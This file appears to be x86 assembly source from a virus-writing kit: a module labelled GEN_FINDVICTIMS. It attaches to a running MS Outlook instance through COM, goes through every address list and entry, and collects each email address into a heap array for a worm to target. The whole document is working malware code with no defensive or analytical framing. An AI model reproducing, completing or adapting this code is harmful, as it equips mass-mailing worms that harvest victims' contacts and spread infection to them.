;Descr:	This gen retrieves email addresses from MS Outlook addressbook in
;	a default process heap
;
;Type:	GEN_FINDVICTIMS
;
;INPUT:
;(EBX)	NONE
;
;OUTPUT:
;(EAX)	DWORD	address of the list of email addresses (in the heap)
;		NULL if error
;

get_email_addresses_from_ol	Proc
	pushad
	@SEH_SetupFrame	<jmp	ol_seh>

	call	ol_delta
ol_delta:
	pop	ebp				;get delta offset

	xor	eax,eax				;initialize variables
	and	[ebp + ol_alloc - ol_delta],eax
	and	[ebp + ol_mem_offset - ol_delta],eax
	and	[ebp + ol_memory - ol_delta],eax

	@pushsz	'OLE32'
	call	esi				;get address of OLE32.DLL
	test	eax,eax
	je	ol_seh
	xchg	eax,ebx
	@pushsz	'CoInitialize'
	push	ebx
	call	edi				;retrieve addresses of APIz
	mov	[ebp + ol_CoInitialize - ol_delta],eax
	@pushsz	'CoUninitialize'
	push	ebx
	call	edi
	mov	[ebp + ol_CoUninitialize - ol_delta],eax

	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.DLL...
	xchg	eax,ebx
	@pushsz	'HeapAlloc'
	push	ebx
	call	edi				;...and of its APIz
	mov	[ebp + ol_HeapAlloc - ol_delta],eax
	@pushsz	'HeapReAlloc'
	push	ebx
	call	edi
	mov	[ebp + ol_HeapReAlloc - ol_delta],eax
	@pushsz	'GetProcessHeap'
	push	ebx
	call	edi

	call	eax				;get default process heap
	test	eax,eax
	je	ol_seh
	mov	[ebp + ol_hHeap - ol_delta],eax

	push	1000h
	push	0
	push	eax
	mov	eax,12345678h
ol_HeapAlloc = dword ptr $-4
	call	eax				;allocate there one page (4kb)
	mov	[ebp + ol_memory - ol_delta],eax
	test	eax,eax
	je	ol_seh

	@pushsz	'OLEAUT32'
	call	esi				;get address of OLEAUT32.DLL
	test	eax,eax
	je	ol_seh
	@pushsz	'GetActiveObject'
	push	eax
	call	edi				;and GetActiveObject API
	xchg	eax,ebx

	push	0
	mov	eax,12345678h
ol_CoInitialize = dword ptr $-4
	call	eax				;initialize COM
	test	eax,eax
	jne	ol_seh

	lea	eax,[ebp + ol_object - ol_delta]
	push	eax
	push	0
	call	ol_clsid
	dd	0006F03Ah,0
	db	0C0h,0,0,0,0,0,0,46h
ol_clsid:
	call	ebx				;get handle to running instance
	test	eax,eax				;of MS Outlook
	jne	ol_quit				;MS Outlook is not active, quit...

	lea	eax,[ebp + ol_dispatch - ol_delta]
	push	eax
	call	ol_idispatch
	dd	00020400h,0
	db	0C0h,0,0,0,0,0,0,46h
ol_idispatch:
	mov	eax,12345678h
ol_object = dword ptr $-4
	push	eax
	mov	eax,[eax]
	call	[eax]				;IUnknown::QueryInterface
	test	eax,eax
	jne	ol_quit

	mov	ebx,12345678h
ol_dispatch = dword ptr $-4

	call	@ol_mapi
	dw	'M','A','P','I',0
@ol_mapi:
	pop	eax
	mov	[ebp + ol_variant_union - ol_delta],eax

	;set mapi = Outlook.GetNameSpace("MAPI")

	mov	dword ptr [ebp + ol_dispatcher_params.Argument_Count - ol_delta],1
	lea	eax,[ebp + ol_variant_argument - ol_delta]
	mov	[ebp + ol_dispatcher_params.Arguments - ol_delta],eax
	mov	edx,110h			;.GetNameSpace
	call	ol_DispInvoke
	jne	ol_quit
	mov	edi,ebx				;EDI = mapi

	;mapi.AddressLists.Count

	dec	dword ptr [ebp + ol_dispatcher_params.Argument_Count - ol_delta]
	mov	edx,210Dh			;.AddressLists
	call	ol_DispInvoke_Get
	jne	ol_quit
	push	50h				;.Count
	pop	edx
	call	ol_DispInvoke
	jne	ol_quit
	mov	ecx,ebx				;ECX = Count

ol_loop1:
	pushad

	;set a = mapi.AddressLists(i)

	inc	dword ptr [ebp + ol_dispatcher_params.Argument_Count - ol_delta]
	lea	eax,[ebp + ol_dword_argument - ol_delta]
	mov	[ebp + ol_dispatcher_params.Arguments - ol_delta],eax
	mov	eax,[esp.Pushad_ecx]
	mov	[ebp + ol_dword_union - ol_delta],eax
	mov	ebx,edi
	mov	edx,210Dh			;.AddressLists
	call	ol_DispInvoke
	mov	edi,ebx				;EDI = a

	;a.AddressEntries.Count

	dec	dword ptr [ebp + ol_dispatcher_params.Argument_Count - ol_delta]
	mov	edx,100h			;.AddressEntries
	call	ol_DispInvoke_Get
	mov	[ebp + ol_address_entries - ol_delta],ebx
	push	50h				;.Count
	pop	edx
	call	ol_DispInvoke
	mov	ecx,ebx

ol_loop2:
	pushad

	;a.AddressEntries.Item(x).Address

	inc	dword ptr [ebp + ol_dispatcher_params.Argument_Count - ol_delta]
	mov	eax,[esp.Pushad_ecx]
	mov	[ebp + ol_dword_union - ol_delta],eax
	mov	ebx,12345678h
ol_address_entries = dword ptr $-4
	push	51h
	pop	edx				;.Item
	call	ol_DispInvoke
	dec	dword ptr [ebp + ol_dispatcher_params.Argument_Count - ol_delta]
	mov	edx,3003h			;.Address
	call	ol_DispInvoke
	mov	esi,ebx				;EDI = address

	call	ol_em_addr
	db	50h dup (?)			;store email address here
ol_em_addr:
	pop	edi
ol_parse:
	xor	ecx,ecx
l_ol:	inc	ecx
	lodsw					;get unicode character
	stosb					;save ANSI character
	test	al,al
	jne	l_ol				;size of email address in ECX


	;dynamicaly allocate memory for addresses and create array of them in there

	add	[ebp + ol_mem_offset - ol_delta],ecx
	mov	ebx,ecx
	mov	eax,12345678h
ol_mem_offset = dword ptr $-4
	cmp	eax,1000h
	jb	ol_alloc_continue		;no need to allocate next page

	mov	eax,2000h
	add	eax,12345678h
ol_alloc = dword ptr $-4
	push	eax
	push	dword ptr [ebp + ol_memory - ol_delta]
	push	0
	push	12345678h
ol_hHeap = dword ptr $-4
	mov	eax,12345678h
ol_HeapReAlloc = dword ptr $-4
	call	eax				;add new 4kb page
	test	eax,eax
	je	end_ol
	mov	[ebp + ol_memory - ol_delta],eax
	mov	ecx,1000h
	add	[ebp + ol_alloc - ol_delta],ecx
	sub	[ebp + ol_mem_offset - ol_delta],ecx
						;correct variables
ol_alloc_continue:
	lea	esi,[ebp + ol_em_addr-50h - ol_delta]
	mov	edi,[ebp + ol_memory - ol_delta]
	add	edi,[ebp + ol_alloc - ol_delta]
	add	edi,[ebp + ol_mem_offset - ol_delta]
	sub	edi,ebx
	@copysz					;copy email address to an array

end_ol:	popad
	dec	ecx
	test	ecx,ecx
	jne	ol_loop2			;second loop (AddressEntry)

	popad
	dec	ecx
	test	ecx,ecx
	jne	ol_loop1			;first loop (AddressList)

ol_quit:mov	eax,12345678h
ol_CoUninitialize = dword ptr $-4
	call	eax				;unitialize COM

ol_seh:	@SEH_RemoveFrame
	popad
	mov	eax,12345678h
ol_memory = dword ptr $-4			;return ptr to an array of addresses in EAX
	ret

ol_DispInvoke:
	push	1				;DISPATCH_METHOD
	jmp	ol_dig2
ol_DispInvoke_Get:
	push	2				;DISPATCH_PROPERTYGET
ol_dig2:pop	eax

	push	0
	push	0
	call	@ol_variant_result
ol_variant_result:
	dw	8				;BSTR
	dw	?
	dd	?
ol_result_union:
	dq	?
@ol_variant_result:
	call	@ol_dispatcher_params
ol_dispatcher_params:
	dq	?,?
@ol_dispatcher_params:
	push	eax
	push	800h				;LOCALE_SYSTEM_DEFAULT
	call	@ol_IID_NULL
	dq	?,?
@ol_IID_NULL:
	push	edx
	push	ebx
	mov	eax,[ebx]
	call	[eax+18h]			;IDispatch::Invoke

	mov	ebx,dword ptr [ebp + ol_result_union - ol_delta]
	test	eax,eax
	ret

ol_variant_argument:
	dw	8				;BSTR
	dw	?
	dd	?
ol_variant_union:
	dd	?,?


ol_dword_argument:
	dw	3				;I4
	dw	?
	dd	?
ol_dword_union:
	dd	?,?

end_get_email_addresses_from_ol:
get_email_addresses_from_ol	EndP